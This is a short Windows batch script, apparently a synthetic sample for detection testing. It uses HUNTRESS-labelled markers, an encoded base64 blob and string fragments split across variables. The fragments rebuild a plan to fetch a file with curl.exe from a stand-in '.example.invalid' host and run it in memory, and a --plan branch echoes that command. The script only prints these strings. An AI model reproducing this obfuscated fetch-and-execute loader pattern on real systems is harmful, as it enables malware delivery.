@echo off
setlocal EnableExtensions EnableDelayedExpansion
rem HUNTRESS-CODEC:split_fragments|add_7
rem HUNTRESS-MATERIAL:fUQ4g3p7bHd6RGhqeHxweWxmeWx0dntsM2twendoe2pvZnRsdHZ5gINoa2h3e2x5RGp8eXM1bH9sg3p7aG5sZmp2fHV7RDiDbnlod29Ec3B1bGh5g3Vsf3tmc2h1bnxobmxEdXZ1bINqaHR3aHBudWZwa0RqaHR3aHBudTRsa2k3PDhoOjxAg3x5c0Rve3t3ekE2NmxraTc8OGg6PEA1bH9odHdzbDVwdX1oc3BrNj89aT43ODloNWtoew==
rem HUNTRESS-EXTENSION:bat
if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT
if /i "%~1"=="--plan" goto :HUNTRESS_PLAN
exit /b 0
:HUNTRESS_INSPECT
set FrAg0=v=1^|steps=acquire_remote,dispatch_memory^|adapte
set FrAg1=r=curl.exe^|stage_count=1^|graph=linear^|next_lang
set FrAg2=uage=none^|campaign_id=campaign-edb051a359^|url=h
set FrAg3=ttps://edb051a359.example.invalid/86b7012a.dat
goto :HUNTRESS_SEPARATOR_DONE
ver >nul && rem HUNTRESS separator double ampersand
:HUNTRESS_SEPARATOR_DONE
set "neutral_string_join=bfe27801"
ver >nul
if errorlevel 1 exit /b 1
set "ReCoVeReD=!FrAg0!!FrAg1!!FrAg2!!FrAg3!"
echo(!ReCoVeReD!
exit /b 0
:HUNTRESS_PLAN
echo curl.exe GET https://edb051a359.example.invalid/86b7012a.dat then dispatch memory
exit /b 0
